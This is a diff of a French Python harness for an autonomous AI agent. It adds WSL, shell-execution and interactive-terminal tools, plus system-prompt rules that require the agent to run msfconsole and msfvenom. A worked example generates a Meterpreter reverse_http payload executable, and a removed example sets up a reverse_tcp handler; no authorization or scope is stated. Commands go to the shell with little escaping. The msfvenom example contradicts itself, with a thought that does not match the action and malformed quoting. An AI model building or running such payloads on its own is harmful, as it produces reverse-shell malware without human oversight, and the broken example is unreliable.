@@ -348,25 +348,23 @@ def execute_python(code: str) -> str:
     except Exception as e:
         return f"Erreur lors de l'exécution du code:\n{traceback.format_exc()}"
 
-def execute_shell_command(command: str, wait_for_completion: bool = True) -> str:
+def execute_shell_command(command: str, wait_for_completion: bool = True, is_linux_command: bool = False) -> str:
     """
-    Exécute une commande shell.
-    - Si wait_for_completion est True (défaut), s'exécute dans une nouvelle fenêtre, attend sa fermeture
-      et capture la sortie via des fichiers temporaires.
-    - Si wait_for_completion est False, lance la commande dans une nouvelle fenêtre et continue immédiatement
-      sans capturer la sortie.
+    Exécute une commande shell. Peut exécuter des commandes Linux via WSL sur Windows.
     """
+    # Si c'est une commande Linux sur Windows, on la préfixe avec "wsl"
+    if is_linux_command and sys.platform == "win32":
+        # On échappe les guillemets pour la sécurité
+        safe_command = command.replace('"', '\\"')
+        command = f'wsl "{safe_command}"' # Utilise "wsl" seul, pas "wsl ubuntu run"
+
+    # --- MODE NON-BLOQUANT ---
     if not wait_for_completion:
-        # --- MODE NON-BLOQUANT ---
         try:
             if sys.platform == "win32":
-                # Utilise 'start' sans '/wait' pour un lancement non-bloquant
                 subprocess.Popen(f'start "Agent Command (Non-blocking)" cmd /c "{command}"', shell=True)
-            # D'autres implémentations pour macOS/Linux pourraient être ajoutées ici si nécessaire
             else:
-                # Sur Linux/macOS, ajouter '&' à la fin d'une commande la met en arrière-plan
                 subprocess.Popen(f'{command} &', shell=True, executable='/bin/bash')
-
             return f"Commande '{command}' lancée en mode non-bloquant. Aucune sortie ne sera récupérée."
         except Exception as e:
             return f"Erreur lors du lancement non-bloquant de la commande '{command}': {e}"
@@ -386,7 +384,6 @@ def execute_shell_command(command: str, wait_for_completion: bool = True) -> str
             final_command = f'start "Agent Command" /wait cmd /c "{redirected_command}"'
             proc = subprocess.Popen(final_command, shell=True)
             proc.wait()
-        # ... (autres logiques pour macOS/Linux) ...
         else:
              return "Le mode attente n'est actuellement bien supporté que sur Windows."
 
@@ -414,38 +411,64 @@ def execute_shell_command(command: str, wait_for_completion: bool = True) -> str
         if stderr_path and os.path.exists(stderr_path):
             os.remove(stderr_path)
 
-def execute_script_from_steps(steps: list, interpreter_command: str, file_extension: str = ".tmp") -> str:
+def execute_interactive_command(command: str) -> str:
     """
-    Exécute un script en arrière-plan et capture sa sortie standard et ses erreurs.
-    Cette version est conçue pour l'automatisation, permettant à l'agent de récupérer et d'analyser le résultat du script.
+    Exécute une commande dans une NOUVELLE FENÊTRE DE TERMINAL VISIBLE ET INTERACTIVE.
+    Cette fenêtre restera ouverte après l'exécution de la commande.
+    Utilisez cet outil pour les processus de longue durée ou interactifs comme msfconsole.
+    NE CAPTURE PAS LA SORTIE, CELLE-CI EST AFFICHÉE DANS LA NOUVELLE FENÊTRE.
+    """
+    try:
+        if sys.platform == "win32":
+            # 'start' ouvre une nouvelle fenêtre.
+            # 'cmd /k' exécute la commande et Garde (Keep) la fenêtre ouverte après.
+            # Aucune redirection de sortie, tout s'affiche dans la nouvelle fenêtre.
+            # On ne met pas '/wait', pour que l'agent puisse continuer son travail.
+            final_command = f'start "Agent Interactive Session" cmd /k {command}'
+            subprocess.Popen(final_command, shell=True)
+        else:
+            # Cette approche simplifiée n'est pas optimisée pour Linux/macOS.
+            return "La fonctionnalité de terminal interactif n'est actuellement optimisée que pour Windows."
+
+        return f"La commande '{command}' a été lancée avec succès dans une nouvelle fenêtre interactive."
+    except Exception as e:
+        return f"Erreur lors du lancement de la commande interactive : {e}"            
+
+def execute_script_from_steps(steps: list, interpreter_command: str, file_extension: str = ".tmp", run_in_wsl: bool = False) -> str:
+    """
+    Exécute un script en arrière-plan. Gère l'exécution via WSL depuis Windows.
     """
     if not all([steps, interpreter_command]):
         return "Erreur : Les étapes du script ou la commande de l'interpréteur sont manquantes."
 
     temp_script_path = None
     try:
-        # Créer un fichier temporaire sécurisé avec l'extension appropriée
-        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix=file_extension, encoding='utf-8') as tmp_file:
+        # NOUVEAU: Gère les fins de ligne pour la compatibilité Linux (WSL)
+        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix=file_extension, encoding='utf-8', newline='\n') as tmp_file:
             temp_script_path = tmp_file.name
-            # Écrit les commandes dans le script. Ajoute un saut de ligne final pour la robustesse.
             tmp_file.write('\n'.join(steps) + '\n')
         
-        # Prépare le chemin pour le shell, en le convertissant au format POSIX si nécessaire (pour Bash sur Windows)
-        script_path_for_shell = pathlib.Path(temp_script_path).as_posix()
+        script_path_for_shell = temp_script_path
+
+        # NOUVEAU: Traduit le chemin Windows en chemin WSL si nécessaire
+        if run_in_wsl and sys.platform == "win32":
+            # Ex: C:\Users\Test -> /mnt/c/Users/Test
+            path_obj = pathlib.Path(temp_script_path)
+            drive = path_obj.drive.lower().replace(':', '')
+            wsl_path = f"/mnt/{drive}{path_obj.as_posix().replace(path_obj.drive, '')}"
+            script_path_for_shell = wsl_path
+            # Préfixe la commande d'interprétation avec wsl
+            interpreter_command = f"wsl {interpreter_command}"
+
         quoted_path = shlex.quote(script_path_for_shell)
         final_command_str = interpreter_command.format(script_path=quoted_path)
 
-        # Exécute la commande en arrière-plan, capture la sortie, et attend qu'elle se termine.
-        # `shell=True` est nécessaire pour que des commandes comme `msfconsole` ou les interpréteurs soient trouvés dans le PATH.
-        # `capture_output=True` redirige stdout/stderr vers l'objet result.
-        # `text=True` décode stdout/stderr en utilisant l'encodage système.
-        result = subprocess.run(final_command_str, shell=True, capture_output=True, text=True, timeout=300) # Timeout de 5 minutes
+        result = subprocess.run(final_command_str, shell=True, capture_output=True, text=True, timeout=300)
 
-        # Nettoyage immédiat du fichier temporaire
         os.remove(temp_script_path)
 
-        # Formate la sortie pour l'agent
-        output = f"--- SCRIPT EXECUTÉ ---\n"
+        output = f"--- SCRIPT EXÉCUTÉ ---\n"
+        output += f"Commande finale: {final_command_str}\n"
         output += f"Code de sortie: {result.returncode}\n"
         
         if result.stdout:
@@ -929,10 +952,12 @@ AVAILABLE_TOOLS = {
     },
         "execute_shell_command": {
         "function": execute_shell_command,
-        "description": "Exécute une commande shell. Peut attendre la fin pour récupérer le résultat (par défaut) ou non.",
+        "description": "Exécute une commande shell. Pour les commandes Linux sur Windows, utiliser le paramètre 'is_linux_command'. Peut attendre la fin pour récupérer le résultat (par défaut) ou non.",
         "params": {
         "command": "string (La commande shell complète à exécuter)",
-        "wait_for_completion": "boolean (Optionnel, défaut: True. Mettre à False pour ne pas attendre la fin de la commande et ne pas récupérer sa sortie.)"}   # <--- Ajoutez une virgule ici si ce n'est pas le dernier outil    
+        "wait_for_completion": "boolean (Optionnel, défaut: True. Mettre à False pour ne pas attendre la fin de la commande.)",
+        "is_linux_command": "boolean (Optionnel, défaut: False. Mettre à True si la commande est pour Linux et doit être exécutée via WSL.)"
+            }
     },    
         "find_contact_email": {
         "function": find_contact_email,
@@ -941,20 +966,38 @@ AVAILABLE_TOOLS = {
     },
         "execute_script_from_steps": {
         "function": execute_script_from_steps,
-        "description": "Exécute une séquence de commandes pour un programme interactif (ex: msfconsole) ou un script shell. Écrit les étapes dans un fichier temporaire et l'exécute. C'est l'outil OBLIGATOIRE pour les tâches multi-étapes en ligne de commande.",
+        "description": "Exécute une séquence de commandes pour un programme interactif (ex: msfconsole) ou un script. Écrit les étapes dans un fichier temporaire et l'exécute. Utiliser 'run_in_wsl=True' pour les scripts Linux sur Windows.",
         "params": {
         "steps": "list[string] (Une liste contenant chaque ligne de commande du script)",
-        "interpreter_command": "string (La commande pour lancer le programme avec le placeholder {script_path}, ex: 'msfconsole -r {script_path}' ou 'bash {script_path}')",
-        "file_extension": "string (L'extension du fichier script, ex: '.rc', '.sh', '.bat')"
+        "interpreter_command": "string (La commande pour lancer le programme avec le placeholder {script_path}, ex: 'bash {script_path}')",
+        "file_extension": "string (L'extension du fichier script, ex: '.rc', '.sh')",
+        "run_in_wsl": "boolean (Optionnel, défaut: False. Mettre à True pour exécuter le script dans WSL depuis Windows.)"
         }
     },
         "read_local_file": {
         "function": read_local_file,
         "description": "Lit le contenu d'un fichier texte local. C'est l'outil à utiliser pour analyser ou comprendre un fichier avant de potentiellement le modifier.",
         "params": {"path": "string (Le chemin complet vers le fichier local à lire)"}
-},
+    },
+        "execute_interactive_command": {
+        "function": execute_interactive_command,
+        "description": "Exécute une commande dans une NOUVELLE FENÊTRE DE TERMINAL VISIBLE ET INTERACTIVE. La fenêtre reste ouverte. À utiliser IMPÉRATIVEMENT pour les programmes interactifs (ex: msfconsole) ou les serveurs que l'utilisateur doit voir et potentiellement contrôler.",
+        "params": {"command": "string (La commande complète à exécuter)"}
+    },
 }
 
+WSL_RULE_PROMPT = """
+# --- AJOUT : RÈGLE IMPÉRATIVE POUR WSL (Windows Subsystem for Linux) ---
+- **RÈGLE CRUCIALE**: Pour toute tâche impliquant l'exécution d'une commande ou d'un script Linux sur un système Windows, tu dois IMPÉRATIVEMENT utiliser les mécanismes prévus à cet effet :
+    - **Pour une commande unique** (ex: `ls -la /tmp`): Utilise l'outil `execute_shell_command` et mets le paramètre `is_linux_command` à `True`. NE JAMAIS écrire 'wsl' toi-même dans le paramètre 'command'.
+        - **Exemple CORRECT**: `{"tool_name": "execute_shell_command", "parameters": {"command": "ls -la", "is_linux_command": true}}`
+        - **Exemple INCORRECT**: `{"tool_name": "execute_shell_command", "parameters": {"command": "wsl ls -la"}}`
+    - **Pour un script ou une séquence de commandes** (ex: msfconsole, scripts .sh): Utilise l'outil `execute_script_from_steps` et mets le paramètre `run_in_wsl` à `True`. N'écris JAMAIS 'wsl' dans le paramètre 'interpreter_command'.
+        - **Exemple CORRECT**: `{"tool_name": "execute_script_from_steps", "parameters": {"steps": ["..."], "interpreter_command": "bash {script_path}", "run_in_wsl": true}}`
+        - **Exemple INCORRECT**: `{"tool_name": "execute_script_from_steps", "parameters": {"steps": ["..."], "interpreter_command": "wsl bash {script_path}"}}`
+- **Cette règle est absolue. Ne pas la suivre mènera systématiquement à un échec.**
+# --- FIN DE L'AJOUT ---
+"""
 
 AGENT_SYSTEM_PROMPT = f"""
 Tu es un agent autonome intelligent. Ta mission est de résoudre la tâche donnée en utilisant une chaîne de pensée (Thought) et d'action (Action).
@@ -967,29 +1010,26 @@ Tu es un agent autonome intelligent. Ta mission est de résoudre la tâche donn�
 # STRATÉGIE ET RAISONNEMENT
 - **Décomposition Logique**: Décompose les problèmes complexes en étapes séquentielles. La sortie d'une action alimente la suivante.
 - **NOUVEAU - STRATÉGIE POUR LES COMMANDES SHELL**:
-    - Si la tâche est d'exécuter une **seule commande simple et indépendante** (ex: "liste les fichiers du répertoire courant"), utilise l'outil `execute_shell_command`.
-    - Si la tâche requiert d'exécuter une **séquence de commandes qui dépendent les unes des autres**, notamment dans un programme interactif comme `msfconsole`, `mysql`, `ssh`, ou pour créer un script shell complexe, tu dois IMPÉRATIVEMENT utiliser le nouvel outil `execute_script_from_steps`.
-    - **Exemple de scénario interactif**:
-        - Tâche utilisateur : "lance msfconsole, puis utilise exploit/multi/handler, configure le PAYLOAD en linux/x86/meterpreter/reverse_tcp, LHOST sur 127.0.0.1 et lance l'exploit en job."
-        - Ton Action JSON DOIT être :
+    - Si la tâche est d'exécuter une **seule commande simple**, utilise l'outil `execute_shell_command`.
+    - Si la tâche requiert d'exécuter une **séquence de commandes**, notamment dans un programme interactif comme `msfconsole`, ou pour créer un script shell, utilise `execute_script_from_steps`.
+    - **Exemple de script shell Linux via WSL**:
         ```json
         {{
           "action": {{
             "tool_name": "execute_script_from_steps",
             "parameters": {{
               "steps": [
-                "use exploit/multi/handler",
-                "set PAYLOAD linux/x86/meterpreter/reverse_tcp",
-                "set LHOST 127.0.0.1",
-                "exploit -j"
+                "echo 'Listing files:'",
+                "ls -la"
               ],
-              "interpreter_command": "msfconsole -r {{script_path}}",
-              "file_extension": ".rc"
+              "interpreter_command": "wsl ubuntu run \\"bash {{script_path}}\\"",
+              "file_extension": ".sh"
             }}
           }},
-          "thought": "La tâche requiert une séquence de commandes dans msfconsole. Je vais utiliser execute_script_from_steps pour créer un fichier de ressources .rc et le lancer. C'est la méthode correcte pour une session interactive."
+          "thought": "La tâche requiert un script shell Linux. J'utilise execute_script_from_steps et je construis la commande d'interpréteur pour qu'elle passe par WSL."
         }}
-        ```
+
+                ```
 - **Stratégie d'Analyse d'Image pour la Géolocalisation**: Pour identifier le lieu d'une photo, suis IMPÉRATIVEMENT cette séquence :
   1.  **Analyse d'abord l'image** avec `analyze_image` pour extraire des indices textuels, des noms de monuments, ou des caractéristiques uniques.
   2.  **Utilise ces indices** avec `web_search` pour formuler une requête et trouver un nom de lieu probable (ville, monument, parc, etc.) et `image_search` pour comparer les images si besoin (ville, rue, batiments, monuments, panneaux, magasin, etc.).
@@ -1020,6 +1060,42 @@ Tu es un agent autonome intelligent. Ta mission est de résoudre la tâche donn�
     2.  **ENSUITE**, et seulement après avoir obtenu une adresse e-mail valide, utilise l'outil `send_email` avec cette adresse.
 - **NE JAMAIS INVENTER UNE ADRESSE E-MAIL**. Si `find_contact_email` retourne "Contact non trouvé", informe l'utilisateur que tu ne peux pas envoyer l'e-mail car le contact est inconnu.
 - Si la tâche te donne déjà une adresse e-mail complète (ex: "envoie un mail à contact@site.com"), tu peux utiliser `send_email` directement.
+- **RÈGLE MSFCONSOLE MSFVENOM**: L'utilisateur a spécifié que l'exécutable `msfconsole` et `msfvenom` fonctionne via les commandes `wsl /snap/bin/msfconsole` et `wsl /snap/bin/msfvenom`. Tu dois **impérativement** utiliser `execute_interactive_command` pour toute commande `msfconsole` et `msfvenom`.
+    - **Exemple :** Au lieu d'écrire `msfconsole -q -x "..."`, tu dois écrire `/snap/bin/msfconsole -q -x "..."`.
+    - Cette règle s'applique à tous les outils (`execute_shell_command`, `execute_script_from_steps`).
+    - **NOUVELLE RÈGLE POUR LES SESSIONS INTERACTIVES**: Pour lancer un programme qui nécessite une interaction de l'utilisateur ou dont la sortie doit être visible en temps réel (comme `msfconsole`, un serveur web, `ssh`), tu dois OBLIGATOIREMENT utiliser le nouvel outil `execute_interactive_command`. N'utilise PAS `execute_shell_command` pour cela, car il est conçu pour les tâches invisibles en arrière-plan.
+- **ORDRE ABSOLU** : Lorsque tu utilises le flag `-x` pour passer des commandes à `msfconsole`, la chaîne de caractères fournie DOIT respecter ce formatage à la lettre :
+    1.  Toutes les commandes doivent être sur **une seule ligne**.
+    2.  Chaque commande doit être séparée de la suivante par un **point-virgule (`;`) SANS espace après**.
+    3.  La chaîne entière doit être entourée de guillemets simples (`'`).
+- **INTERDICTION** : N'utilise JAMAIS de retours à la ligne (`\n` ou `\`) à l'intérieur de la chaîne de commande de `-x`.
+C'est le protocole le plus critique. Suis cet arbre de décision SANS FAILLIR :
+
+**Étape A : Détermine la nature du programme à exécuter.**
+- **CAS 1 : Programme purement INTERACTIF (ex: msfconsole, ssh)**. Ce sont des programmes qui démarrent et attendent une interaction humaine.
+    - **ORDRE** : Utilise OBLIGATOIREMENT l'outil `execute_interactive_command`. La mission de l'agent s'arrête généralement après avoir lancé le programme avec succès.
+
+- **CAS 2 : Outil en ligne de commande qui S'EXÉCUTE, PRODUIT UN RÉSULTAT et SE TERMINE (ex: msfvenom, ls, nmap, cat)**.
+    - **ORDRE** : Utilise `execute_shell_command` (pour une commande simple) ou `execute_script_from_steps` (pour une séquence) et `execute_interactive_command` (pour un programme interactif) . Ces outils sont BLOQUANTS : ils attendent la fin de la commande et te retournent sa sortie (stdout/stderr).
+    - **Workflow obligatoire pour la création de fichiers (ex: msfvenom)** :
+        1. Exécute la commande de création avec `execute_shell_command`.
+        2. Analyse l'observation (`stdout`) pour confirmer le succès (ex: "Saved as: ...").
+        3. (Optionnel mais recommandé) Exécute une seconde commande `execute_shell_command` avec `ls -l` pour vérifier que le fichier existe bien.
+        4. Termine la mission avec `finish`.
+    - **Exemple concret pour msfvenom via WSL**:
+        ```json
+        {{
+          "action": {{
+            "tool_name": "execute_interactive_command",
+            "parameters": {{
+              "command": "wsl /snap/bin/msfvenom -p windows/x64/meterpreter/reverse_http LHOST=localhost LPORT=8080 -f exe -oc:/Users/silve/Desktop/"eva copie"/payload/payload.exe",
+            }}
+          }},
+          "thought": "Je dois créer un payload avec msfvenom. J'utilise execute_shell_command, je fournis la commande Linux SANS 'wsl', je traduis le chemin de sortie Windows en chemin WSL, et je positionne 'is_linux_command' à true. L'outil s'occupera de l'appel à WSL."
+        }}
+        ```
+
+**Étape B : Si la commande est pour Linux (via WSL), applique ces règles.**
 # --- FIN DE L'AJOUT ---    
     
 
